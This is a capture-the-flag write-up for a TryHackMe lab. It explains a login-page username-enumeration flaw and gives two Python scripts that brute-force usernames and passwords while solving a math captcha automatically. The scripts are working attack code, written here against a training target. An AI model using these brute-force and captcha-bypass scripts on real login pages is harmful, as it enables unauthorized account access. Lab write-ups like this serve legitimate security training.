---
title: TryHackMe Writeups | Capture!
date: 2023-05-07 14:40:00 +/-0200
categories: [Tryhackme, Writeups]
tags: [bruteforce, captcha bypass, scripting]
image:
  path: /assets/img/TryhackmeCapture.png
  alt: angstromCTF 2023
---


Hello everyone!, here is my write-up for the TryHackMe challenge [Capture!](https://tryhackme.com/room/capture) it revolves around a company called SecureSolaCoders which has developed a new shiny login page! they said their previous one got hacked so easily!? maybe we can easily hack this one too?  **Let's dive into it!**

|  Difficulty  |  Point  | room link |
| :----------: |:-------:|:---------:|
|     3/10     |  30 pt  |    [:)](https://tryhackme.com/room/capture)   |

## 1. Task 1 - General information
---

![Task 1](/assets/img/TryhackmeCapture1.png){: .shadow  }

So downloading the files, we find that it is a zip file containing two lists, a usernames list and passwords list, seems like we have some brute-forcing going on here

## Task 2 - Bypass the login form 
---
![Task 2](/assets/img/TryhackmeCapture2.png){: .shadow  }

So let's start enumerating!

Doing a Nmap scan reveals a webserver running at port 80 (you probably expected this from the challenge description)

```bash
nmap -sC -sV MACHINE_IP
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-06 23:51 CAT
Nmap scan report for MACHINE_IP
Host is up (0.20s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Werkzeug/2.2.2 Python/3.8.10
```
So we should look at the webpage first

![webserver homepage](/assets/img/TryhackmeCapture3.png){: .shadow  }

Landing on the page, we got redirected to `/login`{:.filepath} route and it displays a login page, if we tried `test/test` credentials, we would notice unique error behavior:

![error upon failed login](/assets/img/TryhackmeCapture4.png){: .shadow  }
_Error: The user 'test' does not exist_

It tells us that __Error: The user 'test' does not exist__! if we looked at [OWASP Auth Guidelines](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html), specifically this section below, we can find that this login form is vulnerable to [discrepancy factor](https://cwe.mitre.org/data/definitions/204.html) attack!

> **Authentication and Error Messages:**<br/>
Incorrectly implemented error messages in the case of authentication functionality can be used for the purposes of user ID and password enumeration. An application should respond (both HTTP and HTML) in a generic manner.
<br/>
**Authentication Responses:**
<br/>
Using any of the authentication mechanisms (login, password reset or password recovery), an application must respond with a generic error message regardless of whether:
<br/>
    1- The user ID or password was incorrect.<br/>
    2- The account does not exist.<br/>
    3- The account is locked or disabled.<br/>
<br/>
The account registration feature should also be taken into consideration, and the same approach of generic error message can be applied regarding the case in which the user exists.
<br/>
The objective is to prevent the creation of a discrepancy factor, allowing an attacker to mount a user enumeration action against the application.
{: .prompt-tip }
So because of this _user doesn't exist_ message, we can try every username from our list with a random password and see which user returns a different error message! 

But we have another problem here, after trying 5 - 10 users the page changes to this:

![Captcha appearence](/assets/img/TryhackmeCapture4.png){: .shadow  }
_Captcha appearence_

They implemented a captcha! now every time we try a new user the page will require us to solve this annoying captcha!!

Luckily for us, it is just a math-based captcha, and who is so good at solving math? Python!

### Solution
---
after the enumeration, we got two tasks to solve:
1. Brute-force every username to find the one that exists, same for passwords
2. Bypass the captcha

this challenge is basically a scripting test, so you **might want to try it on your own first**, but if you want some help here is my script explained

```python
import requests # the most OP library for web scripting!

IP = "MACHINE_IP"
userslist = open("usernames.txt", "r") 

for line in userslist:
    r = requests.post(f'http://{IP}/login', data={'username': 'test','password':'test'}) # This is a request to get the captcha to be displayed on the page since the captcha only appears as a response to a POST request, probably there is a better way to do this idk --_--

    start = '<br>'
    end = '?'
    s = r.text[1800:1900]
    tmp =s[s.find(start)+len(start):s.rfind(end)].replace("=","").replace("\n", "").replace(" ", "") # this is the place the captcha question appears in, most of this jargon is to find the exact place of it and clean it for the eval function
    r2 = requests.post(f'http://{IP}/login', data={'username': line.replace("\n", "").replace(" ", ""),'password':'test','captcha':eval(tmp)}) # one of the tricks that took me some time to figure, is that you need to clean the data from the users file from the new lines (\n) so that it won't get in with the username and falsely temper our usernames

    if "The user" not in r2.text[2070:2135]:# those numbers are  where the error message appears
        print(r2.text[2070:2135])
        break
userslist.close()

# PS: the script expects the site to be in the captcha mode already, so if the script did't work for you it's because you are being a script kiddie:)
```
{: file="capture_username.py" }
So running off the script we get this result

```bash
python capture_username.py
'</strong> Invalid password for user &#39;[REDACTED]&#39;'
```
So we found a username that exists on the system!
now using the same script with some modification, we can brute force the password too!

```python
import requests

IP = "MACHINE_IP"
passwordlist = open("passwords.txt", "r")

for line in passwordlist:
    r = requests.post(f'http://{IP}/login', data={'username': '[REDACTED]','password':'test'})
    start = '<br>'
    end = '?'
    s = r.text[1800:1900]
    tmp =s[s.find(start)+len(start):s.rfind(end)].replace("=","").replace("\n", "").replace(" ", "")
    r2 = requests.post(f'http://{IP}/login', data={'password': line.replace("\n", "").replace(" ", ""),'username':'[REDACTED]','captcha':eval(tmp)}) # same as above except that now we replace the username with the one we found above

    if "Invalid password" not in r2.text[2070:2135]:
        print(r2.text)
        break
passwordlist.close()
```
{: file="capture_password.py" }

running the script and we get our juicy flag!

```bash
python capture_password.py
'<h2>Flag.txt:</h2>'
'<h3>[FLAGTEXT]</h3>'
```

Pretty little fun challenge:") seeing you in another write up!

#### Learned: `Scripting`, `bruteforcing`, `authentication flaws`, `captcha bypass`

